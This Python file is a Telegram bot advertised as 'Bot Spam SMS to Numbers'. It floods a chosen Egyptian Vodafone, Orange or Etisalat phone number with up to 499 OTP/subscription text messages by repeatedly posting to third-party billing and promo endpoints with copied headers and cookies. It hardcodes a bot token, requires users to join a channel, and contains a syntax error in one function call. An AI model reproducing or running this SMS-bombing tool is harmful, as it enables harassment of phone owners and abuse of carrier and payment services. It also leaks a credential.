import os
import time
import requests

try:
    import telebot
    from telebot import *
    from telebot import util
    from telebot import types
except:
    os.system('pip install telebot')
    os.system('pip install PyTelegramBotAPI')
    import telebot
    from telebot import *
    from telebot import util
    from telebot import types

tokin = "2011324628:AAH3vg2WdFUmFItip9Ijq7fyyT7KucgCXL8"

def check_user(user_id):
    global tokin
    request = requests.get(
        f"https://api.telegram.org/bot{tokin}/getChatMember?chat_id=@Team_Xchanel&user_id={user_id}"
    ).text

    if '"status":"left"' in request or '"Bad Request: USER_ID_INVALID"' in request or '"status":"kicked"' in request or 'user not found' in request:
        return False
    else:
        return True

def spam_vodafone(number):
    namber = f'2{number}'
    url = 'http://m.angha.me/gateway.php'
    headers = {
        "Host": "m.angha.me",
        "Connection": "keep-alive",
        "Content-Length": "105",
        "Accept": "application/json, text/plain, */*",
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded;charset\u003dUTF-8",
        "Origin": "http://m.angha.me",
        "Referer": "http://m.angha.me/plus/operators/vodafoneeg?pid\u003d717\u0026source\u003dsignificant%C2%A7sms",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
        "Cookie": "country\u003dnull; userlanguageprod\u003den; language\u003den; _ga\u003dGA1.2.1431828168.1630031794; _gid\u003dGA1.2.1450954303.1630031794; fingerprint\u003deyJmcCI6IjY4MzNhYWEyLWNjMTAtNDAyNy1iN2QyLWUxNjM4YjQ4ZDEzOCIsImgiOiI3MjNlOTljZSJ9; appversion\u003d0.0.2311; _gat\u003d1; cookieChecked\u003dtrue; amplitude_id_7a16172fd03f9288cc765d3224675bbeangha.me\u003deyJkZXZpY2VJZCI6IjIyNGViNzI2LTczMzUtNGY4OC05ZjdmLTIwOWIzN2VjYzFhY1IiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYzMDA0NTEwMDAzMCwibGFzdEV2ZW50VGltZSI6MTYzMDA0NTE1NzcxOCwiZXZlbnRJZCI6MTUsImlkZW50aWZ5SWQiOjIsInNlcXVlbmNlTnVtYmVyIjoxN30\u003d"
    }
    data = {
        'msidn': namber,
        'source': 'significant§sms',
        'resend': '0',
        'planid': '717',
        'output': 'jsonhp',
        'type': 'SUBSCRIBEvodafoneeg'
    }
    request = requests.post(
        url, headers=headers, data=data
    ).text

    if 'ok' in request:
        return True
    else:
        return False

def spam_orange(number):
    url = "http://orangeeg-amazonprimevideo.com/amazon/eg/orange/assets/php/getTicketId.php?lp=&lpLang=ar"
    headers = {
        'Host': 'orangeeg-amazonprimevideo.com',
        'Connection': 'keep-alive',
        'Content-Length': '74',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://orangeeg-amazonprimevideo.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://orangeeg-amazonprimevideo.com/amazon/eg/orange/ar/?send_otp=request',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': '_gcl_au=1.1.313710570.1640734006; _ga=GA1.1.1366308493.1640734006; _ga_HQ56KMYV2F=GS1.1.1640734005.1.1.1640734037.0'
    }
    data = {
        'subscription-type-id': '68560001',
        'MSISDN-input': number,
        'MSISDN': f'2{number}'
    }
    request = requests.post(
        url, headers=headers, data=data
    ).text
    if "سيستغرق هذا بضع لحظات ... نرجو الإنتظار." in request:
        return True
    else:
        return False

def spam_etisalat(number):
    url = "http://gateway.mondiapay.com/mondiapay-etisalat-eg-b2b-v1/web/authorize/pin/send"
    header = {
        'Host': 'gateway.mondiapay.com',
        'Connection': 'keep-alive',
        'Content-Length': '517',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://gateway.mondiapay.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://gateway.mondiapay.com/mondiapay-etisalat-eg-b2b-v1/web/authorize?response_type=code&client_id=d3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe&redirect_uri=http%3A%2F%2Fetisalat-eg-lcm.mondia.com%2Fetisalat-eg-lcm-v1%2Fweb%2Fauth%2FcallBack%3Fclient_id%3Dd3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe%26redirectUrl%3Dhttps%3A%2F%2Fetisalatmusic.com%2Flcm%2Flogin%2Ftoken%3FlcmKey%3DETISALAT_EG_MUSIC%26redirectBack%3D%252Fhome%26access_token%3DCc20196d2-66f1-4fcb-9764-def40c1b4762&scope=false&authMode=AUTH_MODE_AUTO',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    deta = {
        'msisdn': number,
        'clientId': 'd3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe',
        'redirectUrl': 'http%3A%2F%2Fetisalat-eg-lcm.mondia.com%2Fetisalat-eg-lcm-v1%2Fweb%2Fauth%2FcallBack%3Fclient_id%3Dd3a8fa2d-7da7-4ef7-8fb8-bca0cefd9bbe%26redirectUrl%3Dhttps%3A%2F%2Fetisalatmusic.com%2Flcm%2Flogin%2Ftoken%3FlcmKey%3DETISALAT_EG_MUSIC%26redirectBack%3D%252Fhome%26access_token%3DCc20196d2-66f1-4fcb-9764-def40c1b4762&metaData.cssUrl=http%3A%2F%2Fmenad2c.mondiamedia.com%2Fmpay%2Fmondiapay-etisalat-eg-b2b%2Fmusic%2Fcss%2Fapp.css', 'Login': 'LOGIN'
    }
    request = requests.post(
        url, data=deta, headers=header
    ).text
    if 'يرجى إدخال الرمز الذي أرسلناه للتو إلى رقم هاتفك' in request:
        return True
    else:
        return False

while True:
    try:
        bot = telebot.TeleBot(tokin)
        @bot.message_handler(commands=['start'])
        def welcome(message):
            channel = types.InlineKeyboardButton(
                text=" ✲ Channel Developer ",
                url="https://t.me/Team_Xchanel"
            )
            if check_user(message.from_user.id):
                start = types.InlineKeyboardButton(
                    text=" ✲ Start ",
                    callback_data="start"
                )
                programmer = types.InlineKeyboardButton(
                    text=" ✲ Developer ",
                    url="https://t.me/JOOKAMEL"
                )
                Keyboards = types.InlineKeyboardMarkup()
                Keyboards.row_width = 2
                Keyboards.add(start, programmer, channel)
                bot.send_message(
                    message.chat.id,
                    text=f"🌹| Hi {message.from_user.first_name} in Bot Spam SMS to Numbers \n🔰| Please Click",
                    reply_to_message_id=(message.message_id),
                    reply_markup=Keyboards
                )
            else:
                Keyboard = types.InlineKeyboardMarkup()
                Keyboard.row_width = 1
                Keyboard.add(channel)
                bot.reply_to(
                    message,
                    text=f"\n💖| Hi {message.from_user.first_name} \n You must subscribe to the developer's channel Then press \n                                                   /start\n🔰| Subscribe to use the bot",
                    reply_markup=Keyboard
                )

        @bot.callback_query_handler(func=lambda call: True)
        def bot_query_handler(call):
            if call.data == "start":
                run(call.message)
            elif call.data == "vodafone":
                vodafone_get(call.message)
            elif call.data == "orange":
                orange_get(call.message)
            elif call.data == "etisalat":
                etisalat_get(call.message)

        def run(message):
            vodafone = types.InlineKeyboardButton(
                text="Vodafone",
                callback_data="vodafone"
            )
            orange = types.InlineKeyboardButton(
                text="Orange",
                callback_data="orange"
            )
            etisalat = types.InlineKeyboardButton(
                text="Etisalat",
                callback_data="etisalat"
            )
            Key = types.InlineKeyboardMarkup()
            Key.row_width = 1
            Key.add(vodafone, orange, etisalat)
            bot.edit_message_text(
                text=f'🔰| Please Click',
                chat_id=int(message.chat.id),
                message_id=message.message_id
                reply_markup=Key
            )

        def vodafone_get(message):
            msg = bot.reply_to(
                message,
                "\n✲ Enter Number Phone vodafone and Number of messages ✏\n✲ ex : 010xxxxxxxx:100"
            )
            bot.register_next_step_handler(msg, run_vodafone)

        def run_vodafone(message):
            mas = bot.send_message(
                (message.chat.id),
                f'✲ Starting ⏳ Please Wait ...'
            )
            time.sleep(0.5)
            texts = message.text
            text = texts.strip().split(":")
            err = "null"
            if len(text) == 2:
                number = text[0]
                count = text[1]
                if len(str(number)) != 11:
                    err = "Error Namber"
                if int(count) >= 500:
                    err = "Count >= 500"
            else:
                err = "The operation failed ( Error => : )"
            l = 0
            n = 0
            d = 0
            e = 0
            bot.edit_message_text(
                text=f'✲ Starting ⌛ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.5)
            bot.edit_message_text(
                text=f'✲ Starting ⏳ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.5)
            if err == "null":
                bot.edit_message_text(
                    text=f'✲ Starting ⌛ Please Wait ...',
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )
                time.sleep(0.5)
                while n < int(count):
                    l = int((int(n) / int(count)) * 100)
                    try:
                        spam = spam_vodafone(number)
                        if spam:
                            d += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Success Send Message SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        else:
                            e += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send Message SMS ❌ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        time.sleep(0.5)
                        n += 1
                    except:
                        bot.send_message(
                            message.chat.id,
                            text=f"<strong>The operation failed</strong>",
                            parse_mode="html"
                        )
                        break
                l = int((int(n) / int(count)) * 100)
                if d >= 1:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Done Send All SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
                else:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send All SMS ❗️ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
            else:
                bot.edit_message_text(
                    text=f"✲ Error : {err}",
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )

        def orange_get(message):
            msg = bot.reply_to(
                message,
                "\n✲ Enter Number Phone orange and Number of messages ✏\n✲ ex : 012xxxxxxxx:100"
            )
            bot.register_next_step_handler(msg, run_orange)

        def run_orange(message):
            mas = bot.send_message(
                (message.chat.id),
                f'✲ Starting ⏳ Please Wait ...'
            )
            time.sleep(0.5)
            texts = message.text
            text = texts.strip().split(":")
            err = "null"
            if len(text) == 2:
                number = text[0]
                count = text[1]
                if len(str(number)) != 11:
                    err = "Error Namber"
                if int(count) >= 500:
                    err = "Count >= 500"
            else:
                err = "The operation failed"
            n = 0
            d = 0
            e = 0
            l = 0
            bot.edit_message_text(
                text=f'✲ Starting ⌛ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.1)
            bot.edit_message_text(
                text=f'✲ Starting ⏳ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.5)
            if err == "null":
                bot.edit_message_text(
                    text=f'✲ Starting ⌛ Please Wait ...',
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )
                time.sleep(0.5)
                while n < int(count):
                    l = int((int(n) / int(count)) * 100)
                    try:
                        spam = spam_orange(number)
                        if spam:
                            d += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Success Send Message SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        else:
                            e += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send Message SMS ❌ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        time.sleep(0.5)
                        n += 1
                    except:
                        bot.send_message(
                            message.chat.id,
                            text=f"<strong>The operation failed</strong>",
                            parse_mode="html"
                        )
                        break
                l = int((int(n) / int(count)) * 100)
                if d >= 1:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Done Send All SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
                else:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send All SMS ❗️ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
            else:
                bot.edit_message_text(
                    text=f"✲ Error : {err}",
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )

        def etisalat_get(message):
            msg = bot.reply_to(
                message,
                "\n✲ Enter Number Phone etisalat and Number of messages ✏\n✲ ex : 011xxxxxxxx:100"
            )
            bot.register_next_step_handler(msg, run_etisalat)

        def run_etisalat(message):
            mas = bot.send_message(
                (message.chat.id),
                f'✲ Starting ⏳ Please Wait ...'
            )
            time.sleep(0.5)
            texts = message.text
            text = texts.strip().split(":")
            err = "null"
            if len(text) == 2:
                number = text[0]
                count = text[1]
                if len(str(number)) != 11:
                    err = "Error Namber"
                if int(count) >= 500:
                    err = "Count >= 500"
            else:
                err = "The operation failed"
            n = 0
            d = 0
            e = 0
            l = 0
            bot.edit_message_text(
                text=f'✲ Starting ⌛ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.1)
            bot.edit_message_text(
                text=f'✲ Starting ⏳ Please Wait ...',
                chat_id=int(message.chat.id),
                message_id=mas.message_id
            )
            time.sleep(0.5)
            if err == "null":
                bot.edit_message_text(
                    text=f'✲ Starting ⌛ Please Wait ...',
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )
                time.sleep(0.5)
                while n < int(count):
                    l = int((int(n) / int(count)) * 100)
                    try:
                        spam = spam_etisalat(number)
                        if spam:
                            d += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Success Send Message SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        else:
                            e += 1
                            bot.edit_message_text(
                                text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send Message SMS ❌ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                                chat_id=int(message.chat.id),
                                message_id=mas.message_id
                            )
                        time.sleep(0.5)
                        n += 1
                    except:
                        bot.send_message(
                            message.chat.id,
                            text=f"<strong>The operation failed</strong>",
                            parse_mode="html"
                        )
                        break
                l = int((int(n) / int(count)) * 100)
                if d >= 1:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Done Send All SMS ✅ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Loading Success : {d} \n• Loading Error : {e}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
                else:
                    bot.edit_message_text(
                        text=f"━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Error Send All SMS ❗️ \n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n• Number : {number}\n• Count  : {count}\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━\n✲ Loading : {l}%\n━ ━ ━ ━ ━ ━ ━ ✲ ━ ━ ━ ━ ━ ━ ━",
                        chat_id=int(message.chat.id),
                        message_id=mas.message_id
                    )
            else:
                bot.edit_message_text(
                    text=f"✲ Error : {err}",
                    chat_id=int(message.chat.id),
                    message_id=mas.message_id
                )
        try:
            print("Done")
            bot.polling(True)
        except Exception as ex:
            print(f"Error polling : {ex}")
            telebot.logger.error(ex)
    except Exception as er:
        print(f"Error All : {er}")
        continue